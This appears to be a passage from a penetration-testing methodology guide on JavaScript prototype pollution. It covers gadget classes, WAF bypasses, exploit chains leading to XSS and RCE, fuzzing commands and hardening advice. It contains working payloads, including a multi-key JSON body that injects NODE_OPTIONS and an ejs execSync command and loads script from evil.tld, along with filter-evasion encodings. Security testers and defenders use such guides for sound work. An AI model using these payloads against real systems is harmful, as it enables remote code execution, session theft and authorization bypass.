**Client-side third-party SDK config.** Analytics SDKs, feature-flag SDKs, chat widgets often accept a config object on initialization: `SDK.init({apiKey: '...', ...opts})`. If `opts` is default-merged into SDK internal defaults via unpatched merge, the SDK-provided defaults become polluted. Since these SDKs often read `config.scriptSrc` or similar to lazy-load their own JS, this is a direct DOM-XSS chain.

**`window.name` cross-origin.** `window.name` survives navigation cross-origin. An attacker sets `window.name` on their page, navigates to the target, and if the target reads `window.name` as JSON and merges (rare but observed in some legacy analytics flows), pollution fires with attacker-controlled data.

Confirmation per channel: probe the app's initialization sequence and any long-lived listeners for `event.data` / `localStorage.getItem` / `location.hash` reads that flow into a merge. Instrument Object.prototype writes via a `Proxy` wrapper injected before the target's bundle loads.

## Client-Side Gadget-Class Depth

BlackFan's `client-side-prototype-pollution` GitHub repo catalogs the currently known gadgets by library family. The following classes recur across the catalog:

**Loader gadgets.** Any script loader that reads a URL from a global-namespace object as `config.scriptSrc || default` is a gadget. Pollute `Object.prototype.scriptSrc` and the loader fetches attacker JS. Common in analytics SDKs, feature-flag SDKs, chat widgets.

**Template-string interpolation gadgets.** Client-side template libraries (jQuery templates, older Handlebars runtime, Vue in-DOM) that read `config.template` or a similar default from a polluted global — the polluted template compiles into a client-side template-injection primitive. Route to `xss.md § Client-Side Template Injection`.

**Event-handler gadgets.** Some libraries look up event handlers by config-key indirection: `handlers[opts.event || 'default'](evt)`. Polluted `Object.prototype.event = 'attackerControlled'` reroutes handler dispatch.

**URL-builder gadgets.** URL construction with `new URL(input, opts.base)` where opts.base is default-merged from a polluted global — polluted `Object.prototype.base = 'https://evil.tld/'` redirects the constructed URL. Combines with `open_redirect` and SSO callback abuse.

**Sanitizer-config gadgets.** DOMPurify reads options via prototype chain in some code paths; polluted `Object.prototype.ADD_TAGS = ['script']` re-enables script tags on subsequent sanitizer calls. Rare because DOMPurify has hardened many read paths, but a call site that spreads a polluted options object into the sanitizer call is the gadget.

**Router-config gadgets.** Client-side routers (Vue Router, React Router, Angular Router) read route-matching options from config objects. Polluted `Object.prototype.beforeEnter = attackerGuard` installs a navigation guard on every route that doesn't explicitly define one — the guard can redirect to a phishing page, block navigation to force a specific flow, or log every navigation target to an attacker-controlled callback.

**State-management gadgets.** Vuex/Pinia stores, Redux reducers, and MobX observables merge action payloads into state. A Vuex mutation that does `Object.assign(state.user, payload)` is safe (own-property copy). But a custom mutation using `_.merge(state.config, payload)` on a pinned unpatched lodash walks into `__proto__` — the Vuex state is a reactive proxy, and the polluted key propagates to every computed property that reads from state via prototype chain.

**CSS-in-JS gadgets.** Libraries like styled-components and Emotion accept theme objects. A polluted `Object.prototype.color = 'transparent'` makes every unstyled text invisible on the page — a subtle UI manipulation. More critically: polluted `Object.prototype.content` with a `url()` value loads an attacker-controlled resource into every pseudo-element that reads `content` from theme defaults.

**Intersection Observer / Resize Observer options.** `new IntersectionObserver(callback, options)` reads `options.root`, `options.rootMargin`, `options.threshold`. Polluted `Object.prototype.threshold = [0]` changes scroll-triggered behavior for every observer created without explicit threshold — lazy-loaded images or infinite-scroll logic fires at wrong scroll positions. Low severity but demonstrates the breadth of the options-read surface.

Confirmation: with pollution confirmed, walk the target's script bundle for `.scriptSrc`, `.template`, `.base`, `.handler`, `.beforeEnter`, `.theme`, `.content`-shaped reads; each is a candidate gadget.

## WAF & Filter Bypass Classes

Prototype-pollution payloads are string-signature-heavy — `__proto__`, `constructor`, `prototype` are all easy to blocklist. The exploitation surface against a WAF is the mismatch between what the WAF matches and what the parser accepts.

**Encoding layer bypass.**
- URL-encode the brackets: `?%5F%5Fproto%5F%5F%5Bx%5D=y` — some WAFs decode before matching, some don't. Test the WAF's decoding depth by sending a canary that survives one decode round.
- Unicode: `__proto__` variants using full-width underscores (`＿＿proto＿＿`, U+FF3F) reach parsers that normalize before the WAF does not.
- Nested URL-encoding: `%25%35%46%25%35%46proto%25%35%46%25%35%46` — double-encoded, decoded once by the WAF (matches nothing), decoded again by the parser (matches `__proto__`).

**Transport bypass.**
- Content-type: WAF rules often key on `application/json`; sending the payload as `application/x-www-form-urlencoded` with bracket notation reaches the same merge with a different content-type surface.
- Multipart: `Content-Disposition: form-data; name="fields[__proto__][x]"` — the bracket notation lands in multipart field names, which the WAF often does not inspect.
- WebSocket: pollution payloads over WebSocket frames bypass any HTTP-request-level WAF rules.
- GraphQL variable: JSON object in a variable of type `JSON`/`Any` — the WAF typically does not deep-inspect GraphQL variable values.

**Split-across-parameters bypass.** The payload keys can be split across multiple parameters if the app merges them:
```
?a[__proto__]=&b[polluted]=yes
```
If the app does `merge(defaults, req.query.a, req.query.b)`, the two together produce the polluted result but neither individually looks like a full pollution payload.

**Constructor-path bypass of `__proto__`-only WAF.**
```json
{"constructor":{"prototype":{"polluted":"yes"}}}
```
Same primitive class, different key names. WAF rules that don't also block `constructor` + `prototype` combinations miss this.

**Nested-path bypass of top-level filter.** WAF checks the request body's top-level keys against a blocklist but doesn't recurse:
```json
{"user":{"profile":{"__proto__":{"polluted":"yes"}}}}
```
Naive merge recurses depth-first and walks into the nested `__proto__`.

**Character variant bypass.** Some WAFs match `\_\_proto\_\_` with backslash-escaped underscores; the JSON parser dequotes the backslashes, and the resulting `__proto__` key is unfiltered.

**Timing/split bypass.** For hard-limited WAFs that only inspect the first N bytes of the body, place the pollution payload after N bytes of harmless padding.

Iterate one axis at a time and confirm with a canary — the goal is a payload the WAF does not match but the merge still pollutes.

## Composite Chain Construction

A composite chain uses prototype pollution as one hop; the surrounding hops each own a specific capability transfer. The construction methodology:

**Step 1 — enumerate reachable merge points.** Route by parser + downstream. For each candidate endpoint, note which parsers it accepts (JSON, form, multipart, GraphQL, WebSocket) and which sinks are downstream of the merge (grep for the target's sink families in the section above).

**Step 2 — pick the polluted key to match a sink.** A pollution primitive without a specific downstream sink is a low-impact finding. The polluted key is chosen to match: `env` for spawn env, `outputFunctionName` for ejs, `main` for require (pre-Node-v18.19.0), `scriptSrc` for a specific script loader on the page.

**Step 3 — build the chain end-to-end.**

*Chain A — client-side pollution → DOM XSS via script loader:*
1. Pollution primitive: hash-fragment pollution via `location.hash` → client-side router → merge into config defaults.
2. Polluted key: `scriptSrc`.
3. Downstream sink: the SDK's script loader reads `config.scriptSrc || defaultCDN` and appends a `<script>` element.
4. Impact: attacker JS runs in origin, session cookie exfiltrated, actions taken as user.
5. Route: `xss.md § DOM Clobbering` for the clobbering-adjacent case, `xss.md § Post-Exploitation` for exfil.

*Chain B — JSON pollution → template SSTI → RCE:*
1. Pollution primitive: JSON body accepted by an endpoint that merges into template context.
2. Polluted key: `outputFunctionName` (ejs) or `escapeFunction`.
3. Downstream sink: any subsequent `ejs.render(...)` call.
4. Impact: attacker JS runs in the render function, executes `child_process.execSync`.
5. Route: `ssti.md` for the compile-time SSTI class, `rce.md` for the exec.

*Chain C — JSON pollution → NPM CLI env-spread → git-command RCE:*
1. Pollution primitive: JSON body with nested `env.GIT_SSH_COMMAND`.
2. Polluted key path: `env.GIT_SSH_COMMAND=attacker command`.
3. Downstream sink: any package installation or update that spawns git for a git-hosted dependency.
4. Impact: attacker command runs as the npm process.
5. Route: `prototype_pollution_novel_deep.md § NPM CLI End-to-End Chain`.

*Chain D — persistent pollution → export worker pollution → export RCE:*
1. Pollution primitive: attacker writes a profile bio containing `__proto__`.
2. Trigger: nightly PDF export merges bio into template context via unpatched worker-lodash.
3. Polluted key: `outputFunctionName`.
4. Downstream sink: pug/ejs compile in the export process.
5. Impact: RCE in the export worker (secrets, S3 credentials, DB connection).
6. Route: `§ Second-Order Deep` above, then `ssti.md`, then `rce.md`.

*Chain E — pollution → per-instance-scope method override (devalue class):*
1. Pollution primitive: `devalue.parse` on attacker JSON before the fix.
2. Polluted target: reconstructed class instance's prototype (not `Object.prototype`).
3. Downstream sink: application code calls a method on the reconstructed instance; the method now runs attacker code.
4. Impact: scoped code execution during instance-method dispatch.
5. Route: `prototype_pollution_novel_deep.md § devalue CVE-2025-57820`.

*Chain F — pollution → fetch agent override → MITM in outbound requests:*
1. Pollution primitive: any of the above.
2. Polluted key: `agent` (with `rejectUnauthorized: false`).
3. Downstream sink: any `https.request` or `fetch` where the caller doesn't set agent explicitly.
4. Impact: attacker in network position can intercept outbound TLS to third-party APIs.
5. Route: `ssrf.md` for chain composition with SSRF; the pollution is the agent-swap precondition.

## Confirmation Methodology — Advanced

The base's canary-on-unrelated-object test is the minimum. Advanced confirmation:

**Differential across parsers.** Fire the same payload via JSON, form, multipart, GraphQL. The differential — which channel pollutes and which doesn't — narrows the vulnerable parser and rules out coincidence.

**Differential across canary keys.** Pollute `Object.prototype.canaryA`, hit endpoint. Pollute `Object.prototype.canaryB` on a *different* endpoint. Then probe both from a third endpoint. Confirms whether both endpoints share the same worker (pollution visible to both) or different workers (only one visible).

**Cleanup verification.** After confirming pollution, delete the polluted key (`delete Object.prototype.canary`) via a follow-up request if the app has a `delete` semantic (rare), or wait for worker recycling. Confirm the canary is gone. This proves the pollution is *state*, not a spurious reflection.

**Impact-first confirmation.** For an auth-bypass chain, skip the canary and go straight to the impact: pollute `Object.prototype.isAdmin` and hit an admin-guarded endpoint. If the guard reads `user.isAdmin` via prototype chain, the admin route serves — this is confirmation *and* impact in one payload.

**Non-obvious own-property override.** If `user.isAdmin` is explicitly set to `false` on the user object, pollution doesn't override it (own property beats inherited). Confirm the guard doesn't have a default-false own property — read the code or trigger with a payload that pollutes a key the app is known to leave undefined (`opts.experimentalFlag`, `opts.debug`).

**Timing-baseline check.** For time-based blind, take a baseline of 50 unpolluted request timings, then pollute a timeout key, then take 50 more. Statistical significance (Mann-Whitney U) confirms; a visible-only difference is not the finding.

**Cross-process check for daemon patterns.** Pollute from the request path; then observe a scheduled job / background worker log for the canary in its computed defaults. Confirms whether pollution crosses process boundaries (it doesn't, unless the pollution is written to a shared store the worker also reads).

## Runtime Detection Instrumentation

Static grep finds candidate merges; runtime instrumentation confirms which candidates actually fire on the request path and observes pollution as it happens.

**Server-side (Node) — instrument `Object.prototype` writes.** Insert at process startup, before app bundle loads:
```javascript
const origDefineProperty = Object.defineProperty;
const origSet = Reflect.set;

Object.defineProperty = function (obj, prop, desc) {
  if (obj === Object.prototype || obj === Array.prototype ||
      obj === Function.prototype) {
    console.error('PP-INSTR defineProperty on', obj === Object.prototype ? 'Object.prototype' : obj.constructor?.name,
                  'key:', prop, 'stack:', new Error().stack.split('\n').slice(2, 6).join('\n'));
  }
  return origDefineProperty.call(this, obj, prop, desc);
};
```
Every write to `Object.prototype` (or Array/Function) is logged with a stack trace pointing to the vulnerable merge. During a normal request cycle the log is empty; sending a pollution probe surfaces the exact call site.

**Server-side — set a canary and check inheritance on every request.** Insert an Express middleware:
```javascript
app.use((req, res, next) => {
  if (({}).canary !== undefined) {
    console.error('PP-INSTR pollution detected before request:', req.method, req.path);
  }
  next();
});
```
This misses pollution introduced during the current request but catches persistence across requests — for confirmation of the persistence class in `§ Blind Pollution`.

**Client-side — Proxy `Object.prototype` writes.** Inject before the app bundle:
```html
<script>
const forbidden = new Set(['__proto__', 'constructor', 'prototype']);
const p = new Proxy(Object.prototype, {
  set(target, key, value) {
    console.error('PP-INSTR client-side set on Object.prototype:', key, value, new Error().stack);
    return Reflect.set(target, key, value);
  }
});
Object.setPrototypeOf({}, p);
</script>
```
Combined with DevTools breakpoint on the console.error, gives an interactive workflow for tracing the client-side merge that fires.

**`agent-browser` instrumentation.** For stored/blind client-side confirmation, use the sandbox's `agent-browser` with the eval hook — hook `Object.defineProperty` on Object.prototype, drive the target's UI, screenshot when the alarm fires. See `xss.md § Tooling` for the eval-hook pattern.

**Node --disable-proto=throw for negative confirmation.** Running the target under `--disable-proto=throw` turns all `a.__proto__ = X` writes into `ERR_PROTO_ACCESS`. If the target still works normally, no code path is writing `__proto__` directly — pollution must come via `constructor.prototype` or a walk-into-prototype-chain merge. If the target crashes on startup, the app itself uses `__proto__` writes for legitimate purposes (bad code) and cannot be hardened this way without refactor.

## Cross-Request Persistence Windows

Pollution persists as long as the process holds `Object.prototype`. Real deployments introduce boundaries that limit or reset the window.

**Single-process (dev, `node app.js`).** Pollution persists until process restart. Every request thereafter sees polluted state.

**Cluster / worker_threads (production, `pm2 -i N`).** Pollution persists per worker. A round-robin load balancer distributes probes across workers; only the workers that received the pollution payload are polluted. Confirmation shows a partial-hit ratio — e.g., 1 in 4 probes returns admin data.

**Serverless (Lambda, Cloudflare Workers, Vercel Functions).** Pollution persists within a warm invocation container. The classic Lambda warm-container reuse means a pollution injection in one invocation persists for subsequent invocations on the same container until it is recycled (minutes to hours). Cold-start containers are fresh — no pollution. The exploit is unreliable but real for target patterns where warm containers dominate.

**Kubernetes rolling pods.** Pollution persists per pod. Pod recycling on deploy resets. Pollution can persist across autoscaler-added pods only if the pollution mechanism is triggered again on the new pod.

**Read-only filesystems / immutable images.** Do not affect pollution; the primitive is in-memory.

Confirmation of the deployment model: send a canary, then repeatedly probe over a period matching the deployment's expected recycle interval. Persistence beyond a request cycle confirms in-worker state; persistence beyond a config reload cycle confirms process-level state.

## Supply-Chain Prototype Pollution Vectors

Prototype pollution via the supply chain targets the build/install pipeline rather than the running application. The pollution fires during `npm install`, CI build, or dev-server startup — before the application's own defenses load.

**postinstall script pollution.** A malicious npm package's `postinstall` script runs arbitrary Node code during `npm install`. If the script pollutes `Object.prototype` before subsequent install steps run, every package installed after it in the dependency resolution order inherits the polluted prototype. Impact: the polluted env reaches subsequent postinstall scripts' spawn calls — a single pollution payload in an early-installed package can compromise every later package's install step.

**Lockfile injection.** The NPM CLI end-to-end chain (novel sibling) demonstrates the class: a crafted `npm-shrinkwrap.json` or `package-lock.json` containing diff-shaped pollution payloads triggers pollution during `npm install`. The lockfile is parsed before the app code runs — there is no app-level defense against lockfile-driven pollution.

**Transitive dependency pinning.** An application pins its direct dependency to a safe version, but a transitive dependency (dependency of a dependency) pins an older, vulnerable merge utility. The pollution primitive is in the transitive dep; the fix is lockfile-level (`npm ls <pkg>` to find all copies, then override or dedupe).

**Monorepo workspace hoisting.** In monorepo setups (npm workspaces, yarn workspaces, pnpm), a vulnerable merge utility hoisted to the root `node_modules` is shared across all workspace packages. Pollution in one workspace's request path affects all workspaces in the same process (dev server, test runner).

**`.npmrc` / `.yarnrc.yml` config merges.** npm and yarn read config files and merge them into runtime options. A `.npmrc` placed in a dependency's directory (via a chained path-traversal finding or a compromised dependency) can set `registry`, `//registry.npmjs.org/:_authToken`, or other sensitive options if the config merge walks into a `__proto__` key in the ini-parsed result.

**CI build-cache pollution.** CI runners that cache `node_modules` across builds preserve polluted state if the pollution fires during install and the worker process persists (warm CI runners). Subsequent builds on the same runner inherit the polluted `Object.prototype` from the cached worker process.

**Dev-dependency-only pollution.** A devDependency's require-time initialization code pollutes `Object.prototype`. The pollution fires only in development/test environments (not production), but affects: test assertions (polluted defaults change test outcomes), dev-server behavior (polluted middleware options), and build output (polluted build config). A devDependency that "only runs in dev" can still compromise the production build if the build step runs in the same process.

**Detection.** `npm audit` and `yarn audit` catch known-CVE packages but miss the small-utility-family class (novel sibling's utils-extend pattern). Supplement with:
1. Lockfile grep for small merge utilities (name pattern: `*-merge`, `*-extend`, `*-assign`, `deep-*`, `*-deep`).
2. Postinstall script audit: `npm ls --json | jq '.dependencies | to_entries[] | select(.value.scripts.postinstall)'` to enumerate all postinstall scripts in the tree.
3. Full-tree version check: `npm ls <known-vulnerable-pkg>` for each entry in the CVE table (novel sibling) to find transitive copies.

## Anti-Pattern Detection Playbook (White-Box)

Grep patterns for identifying vulnerable merge points at scale in a target's codebase:

```
# Deep-merge on user input
rg 'lodash.*merge\s*\(.*(req\.body|req\.query|req\.params|input|userData)'
rg 'defaultsDeep\s*\(.*(req\.body|req\.query|req\.params|input|userData)'
rg 'deep-extend|merge-deep|merge-options|hoek.merge|mixin-deep|assign-deep'

# Bespoke recursive merge (the dominant pattern once mainstream libs are patched)
rg 'for\s*\(\s*(?:const|let|var)\s+\w+\s+in\s+\w+\s*\)\s*\{\s*\w+\[\w+\]\s*='
rg 'function\s+\w*[Mm]erge\s*\('
rg 'Object\.assign\s*\(.*process\.env'

# Set-by-path with attacker-controlled path
rg 'set-value|dset|_.set\('
rg 'lodash.set\s*\('

# Custom set-path that walks
rg 'function\s+setPath\s*\('
rg 'function\s+setDeep\s*\('

# Sink families reading via prototype
rg 'ejs\.(render|compile)'
rg 'pug\.(render|compile|compileFile)'
rg 'handlebars\.compile'
rg 'lodash\.template'

# child_process callers doing env-spread
rg 'const\s*\{\s*env\s*\}\s*=\s*(?:options|opts|args)'
rg '\.\.\.process\.env\s*,\s*\.\.\.'

# Legacy js-yaml
rg 'js-yaml.*load\s*\(' | rg -v 'safeLoad'
rg 'require\([\047\042]js-yaml[\047\042]\).*\.load\('
```

Confirm each hit's version pin in the lockfile — a `_.merge` on lodash 4.17.21 is not the finding; on 4.17.4 it is.

For runtime dynamic analysis, hook `Object.defineProperty(Object.prototype, ...)` and `Reflect.setPrototypeOf` at the target's startup and log every write during a normal request cycle. A write from user-request-adjacent code is a candidate merge point.

## Multi-Key Payload Construction

Single-key payloads are the introductory case; a single well-crafted payload can seed multiple pollution keys simultaneously to set up a multi-hop chain in one request.

**Chained pollution shape.** One JSON body pollutes several `Object.prototype` keys at once:
```json
{
  "__proto__": {
    "env": {"NODE_OPTIONS": "--require /tmp/evil.js"},
    "isAdmin": true,
    "outputFunctionName": "x;require('child_process').execSync('id')//",
    "agent": {"rejectUnauthorized": false},
    "scriptSrc": "https://evil.tld/x.js"
  }
}
```
This seeds four gadgets simultaneously — env-spread (RCE via next spawn), auth-bypass (isAdmin), ejs template (RCE via next render), fetch agent (silent MITM), and DOM loader (client-side XSS if the pollution is client-side too).

**Ordering matters.** If the app's next code path calls `spawn` before it re-reads any of the other keys, only env-based execution fires; the other keys sit in prototype waiting for a caller that reads them. Downstream cleanup (`delete Object.prototype.env`) removes only that key; the other planted keys persist.

**Detection resistance via redundancy.** A WAF that blocks `NODE_OPTIONS` in JSON body values still misses the other four keys — the payload seeds impact via whichever gadget the app happens to reach first.

**Constructor-path multi-key.**
```json
{
  "constructor": {
    "prototype": {
      "env": {"...": "..."},
      "isAdmin": true
    }
  }
}
```
Same primitive class, different key names — bypasses filters that block only `__proto__` as the top-level key.

## Cross-Runtime Env-Variable Taxonomy for Env-Spread Chains

The env-spread gadget (polluted `Object.prototype.env` reaching `child_process.spawn`) carries attacker-controlled environment variables into the child process. The impact depends on which env vars the child runtime reads. The taxonomy below maps env vars to execution primitives per runtime.

**Node.js env vars that trigger execution:**
- `NODE_OPTIONS` — accepts `--require <file>`, `--import <url>`, `--inspect-brk=<host>:<port>` (CDP), `--experimental-loader <url>`. Each is a code-execution vector.
- `NODE_PATH` — prepends to module search path; polluted value causes `require('x')` to load from an attacker-controlled directory.
- `NODE_EXTRA_CA_CERTS` — loads additional CA certificates; polluted value can add attacker CA, enabling MITM on TLS connections.
- `UV_THREADPOOL_SIZE` — controls libuv thread pool; setting to 0 or very large values is a DoS vector.

**Python env vars (when Node spawns a Python child):**
- `PYTHONSTARTUP` — script executed on interactive startup; less useful for non-interactive children.
- `PYTHONPATH` — prepends to module search path; `import os` loads attacker-controlled `os.py`.

**Ruby env vars:**
- `RUBYOPT` — accepts `-r<file>` to require a file on startup; direct code execution.
- `RUBYLIB` — prepends to load path; same `require` hijack as PYTHONPATH.
- `GEM_HOME` / `GEM_PATH` — redirects gem resolution to attacker-controlled directory.

**Shell / system env vars:**
- `LD_PRELOAD` (Linux) / `DYLD_INSERT_LIBRARIES` (macOS) — loads a shared library into every dynamically linked process. Direct code execution in any spawned binary. macOS SIP blocks `DYLD_*` for system binaries but not for user-installed ones.
- `PATH` — prepends attacker-controlled directory; any subsequent command resolution (`git`, `curl`, `python`) loads the attacker's binary instead.
- `GIT_SSH_COMMAND` — executed by git for SSH operations; direct command execution when git is spawned.
- `EDITOR` / `VISUAL` — executed when a program opens an editor (git commit, crontab -e); less common in automated contexts.
- `http_proxy` / `https_proxy` / `HTTP_PROXY` / `HTTPS_PROXY` — redirects outbound HTTP/HTTPS through attacker proxy; silent MITM.

**Java env vars (when Node spawns a Java child):**
- `JAVA_TOOL_OPTIONS` — JVM reads this for command-line arguments; accepts `-javaagent:<path>` for arbitrary bytecode instrumentation.
- `CLASSPATH` — prepends to class search path; attacker-controlled class loaded by `Class.forName`.

**Exploitation priority.** For the env-spread gadget, choose the polluted env var by the child process type: if the child is Node, use `NODE_OPTIONS`; if git, use `GIT_SSH_COMMAND`; if any dynamically linked binary on Linux, use `LD_PRELOAD`; if the child type is unknown, `PATH` prefix is the broadest vector (affects all command resolution).

## Object.freeze(Object.prototype) — Bootstrap Hardening

A defense pattern that stops the pollution primitive at the source: at process bootstrap, freeze the built-in prototypes.

```javascript
// Run BEFORE any application code
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
Object.freeze(Function.prototype);
```

**What it stops (measured behavior on Node ≥ v10).** Subsequent writes to `Object.prototype.x = y`, `Reflect.set(Object.prototype, ...)`, and `Object.defineProperty(Object.prototype, ...)` all fail silently (non-strict) or throw `TypeError: Cannot assign to read only property` (strict). Merges that walk into `__proto__` no longer pollute.

**What it does NOT stop.**
- **Direct `a.__proto__ = attackerControlled` on a specific object.** Freezing `Object.prototype` freezes the *object* Object.prototype, not the `__proto__` accessor on other objects. Reassigning `a.__proto__` to attacker-controlled value still works and still allows scoped exploitation of `a` (the devalue class).
- **Class-specific prototypes.** Freezing `Object.prototype` doesn't freeze `EventEmitter.prototype`, `Buffer.prototype`, third-party class prototypes. Pollution targeting those still works if the merge reaches them.
- **Legitimate app code that writes to Object.prototype at startup.** Some apps add utility methods via `Object.prototype.foo = ...` (bad practice but common in legacy code); freezing breaks them. The mitigation must run after such setup or those methods must be moved.
- **Node core's own writes.** Node itself may write to Object.prototype during module initialization (rare in modern versions). Test the freeze on the target's actual startup path.

**Confirmation of the freeze at target.** Send a canary pollution payload; if the response shows the canary key does NOT appear as inherited on unrelated objects, the freeze (or an equivalent guard) is in place. Report it as "pollution primitive blocked at prototype layer" — the finding shifts to alternative pollution surfaces (class prototypes, direct `a.__proto__ =` scoped exploitation).

## TypeScript-Typed Codebases — Type Safety Is Not a Guard

TypeScript's type system rejects `obj.__proto__ = anything` at compile time when the type of `obj` is a specific interface. This produces a widespread false sense of safety.

**What TypeScript does not do:**
- **Runtime enforcement.** TypeScript compiles to plain JavaScript; the compiled output is unchanged. `obj.__proto__ = attacker` at runtime is exactly as exploitable as in a plain JS codebase.
- **Prevent merges.** `lodash.merge(defaults, req.body as any)` — the `as any` cast is common in framework glue code and disables TS's structural check.
- **Prevent inherited-property reads.** `if (user.isAdmin)` compiles unchanged; the runtime read hits the polluted prototype.
- **Prevent structural narrowing to include inherited.** `{...userInput}` spread returns `Partial<InputType>` at compile time; at runtime it spreads own props (which include a `__proto__` own property that a subsequent merge can walk).

TypeScript-heavy codebases often have MORE pollution surface than plain-JS ones because the compile-time confidence causes weaker runtime validation — `zod`/`class-validator` schemas are the actual runtime guard; the presence of TypeScript types is not.

**Detection: grep TS codebases for `as any`, `as unknown as`, and `Record<string, unknown>` types on request handlers.** Each is a runtime-validation-missing site where pollution can pass through the compile-time check.

## Prototype Pollution in Micro-Frontend Architectures

Micro-frontend architectures (webpack Module Federation, single-spa, import maps) share JavaScript scope across independently deployed applications. Prototype pollution in any one micro-frontend affects all others sharing the same runtime scope.

**Shared global scope.** Module Federation's shared scope is a plain JavaScript object on `window.__federation_shared__` (or an internal scope variable). Pollution of `Object.prototype` in one remote affects every federated module that reads defaults from the shared scope — a cross-application pollution vector with no application-level boundary.

**Import map poisoning.** Import maps (`<script type="importmap">`) map bare specifiers to URLs. While the browser's import-map implementation is native (not susceptible to JS-level pollution), a dynamically constructed import map assembled from a plain JS object IS susceptible — a build-time or SSR-time system that constructs the import map via `JSON.stringify(importMapObj)` where `importMapObj` is a plain `{}` leaks polluted keys into the map. Polluted `Object.prototype['react'] = 'https://evil.tld/react.js'` in the import-map-construction step substitutes the module URL.

**single-spa route config.** `registerApplication(config)` reads `config.app`, `config.activeWhen`, `config.customProps`. Polluted `Object.prototype.activeWhen = () => true` causes a dormant micro-frontend to activate on every route — potentially loading an attacker-controlled bundle.

**Shared dependency version negotiation.** Module Federation's `shared` config object determines which version of a shared dependency each remote uses. Polluted `Object.prototype.singleton = true` forces all remotes to use the same instance — if one remote has a vulnerable version, the forced singleton exposes all remotes. Polluted `Object.prototype.requiredVersion = '*'` removes version constraints, allowing any (including vulnerable) version to satisfy the share.

**Iframe-isolated micro-frontends.** Micro-frontends in iframes have separate JS runtimes — pollution in one iframe does NOT affect another. `postMessage` between iframes is the only cross-boundary channel, and the receiving listener's merge behavior is the pollution vector (see `§ Client-Side Pollution Channels`). Iframe isolation is the structural defense against cross-micro-frontend pollution.

**Detection.** In micro-frontend targets:
1. Identify the federation mechanism (Module Federation, single-spa, import maps, iframes).
2. For shared-scope architectures: a pollution payload in any one remote is a finding for the entire host.
3. For iframe-isolated: each iframe is an independent pollution target; cross-iframe pollution requires a chained postMessage or shared-storage vector.

## Framework Hardening Depth

Each major Node framework has taken different approaches to prototype-pollution defense. Knowing where each framework hardens and where it doesn't narrows the exploitation surface per target.

**Express.** Does not harden itself. `req.body` is whatever `body-parser` produces (raw parsed JSON). `req.query` uses `qs` by default (nested-object expansion, preserves `__proto__`). Defense is app-owner responsibility: `app.set('query parser', 'simple')` to use flat `querystring`; validate all body input with `zod`/`joi`/`ajv` before merging.

**Fastify.** JSON body-schema validation is default when route has a schema. Nested-object schemas with `additionalProperties: false` strip unrecognized keys (including `__proto__` if the schema doesn't allow it). But `additionalProperties: true` (or omitted) passes everything through — grep the target's route schemas. Query-string parser is more restrictive than Express by default.

**Koa.** Uses `koa-bodyparser` (delegates to `raw-body` + `JSON.parse`) — preserves prototype keys. Same as Express in effect for body parsing.

**NestJS.** Uses class-validator + class-transformer. `@Body() dto: UserDto` with `whitelist: true` in the ValidationPipe strips non-decorated properties (including `__proto__`). `whitelist: false` (default in some configs) passes through. `forbidNonWhitelisted: true` throws — the strongest hardening. Grep for `new ValidationPipe(` in main.ts to identify config.

**tRPC.** Zod-validated inputs at each procedure boundary. Zod's `.strict()` rejects unknown keys; `.strip()` (default) removes them. `.passthrough()` keeps them. A tRPC codebase's exposure depends on which mode each procedure uses.

**Next.js API routes.** No built-in validation. `req.body` is `body-parser`-parsed; same shape as Express. Developer must add validation.

**Sails / Meteor / older frameworks.** Vary; check the specific version's `qs`/`body-parser` config.

Confirmation: for each framework, check whether a canary `__proto__` key survives the framework's validation layer to reach the handler. If it does, the framework is not hardening; the app's own validation is what matters.

## Pollution-Aware Automated Discovery

Manual grep and canary probing find pollution primitives and sinks individually; automated approaches combine static analysis with runtime probing to discover end-to-end chains at scale.

**Static taint analysis (CodeQL, Semgrep).** CodeQL's JavaScript library models data flow from source (request parameters) through transformations (JSON.parse, merge functions) to sinks (child_process, template compile). A custom CodeQL query for prototype pollution chains:
1. Source: any `req.body`, `req.query`, `req.params`, GraphQL variable, WebSocket `message.data`.
2. Sanitizer: `Object.hasOwn` guard, `Map` constructor, `Object.create(null)`, key-blocklist filter.
3. Sink variant A (merge): any function matching the `for (k in src) target[k] = src[k]` pattern, or calls to `_.merge`, `_.defaultsDeep`, `Object.assign` in a loop, `deep-extend`, etc.
4. Sink variant B (read): property access on a merged result that controls auth (`if (user.isAdmin)`), template compile options, spawn env, or URL construction.

Semgrep rules for the same class use pattern matching on the AST; the tradeoff is Semgrep is faster but less precise on inter-procedural flow. Use Semgrep for fast triage on the full codebase, then CodeQL for precise chain confirmation on candidates.

**Dynamic taint tracking (Node --experimental-policy + custom loader).** Node's experimental policy mechanism (`--experimental-policy=policy.json`) restricts module loading and can hook into the module loader. A custom loader that instruments `Object.defineProperty` on prototype objects captures every runtime write to `Object.prototype`, with the full call stack at the write site. Run the target under the instrumented loader, replay a traffic capture (HAR file or Burp history), and collect the write-site inventory.

**Fuzzing with prototype-pollution oracles.** Standard web fuzzers (ffuf, nuclei) spray payloads and check responses for the payload echo. Prototype-pollution fuzzing needs a two-request oracle:
1. **Injection request:** send the pollution payload to the target endpoint.
2. **Oracle request:** hit an unrelated endpoint and check for the canary on a prototype-inherited read.

The oracle request is what distinguishes PP fuzzing from standard input-reflection fuzzing. Automate the pair:
```bash
# Injection: pollute via each candidate endpoint
curl -s -X POST "$TARGET/api/endpoint" -H 'Content-Type: application/json' \
  -d '{"__proto__":{"ppCanary_'$RANDOM'":"yes"}}'

# Oracle: check unrelated endpoint for the canary
curl -s "$TARGET/api/health" | grep -q 'ppCanary' && echo "POLLUTION CONFIRMED on $TARGET/api/endpoint"
```

Iterate the injection across all POST/PUT/PATCH endpoints and all content-types (JSON, form, multipart, GraphQL). The oracle endpoint should be a lightweight read-only endpoint that reflects server-computed defaults (health check, config dump, error page with debug info).

**Dependency-tree scanner.** For white-box targets, scan the full `node_modules` tree for the small-utility-family pattern (novel sibling's utils-extend class):
1. Extract all packages from the lockfile.
2. Filter to packages whose `package.json` description matches `/merge|extend|assign|deep.*copy|recursive.*assign/i`.
3. For each candidate, run the merge-clone matrix test (§ Pollution Primitive Measurement Methodology below) in an isolated process.
4. Report any package that pollutes, with version, vector (`__proto__` vs `constructor.prototype`), and position in the dependency tree.

**Integration with CI.** Run the dependency-tree scanner and CodeQL query on every PR. A new dependency that introduces a pollution primitive is a blocking finding; a code change that adds a `for..in` merge on user input is a blocking finding. The CI gate catches regressions before they ship.

## Pollution Primitive Measurement Methodology

When the target's merge/copy behavior is uncertain, runtime measurement resolves ambiguity faster than static analysis. The methodology below produces a definitive yes/no per library version.

**Merge-clone matrix test.** For each candidate merge library in the target's dependency tree:
```javascript
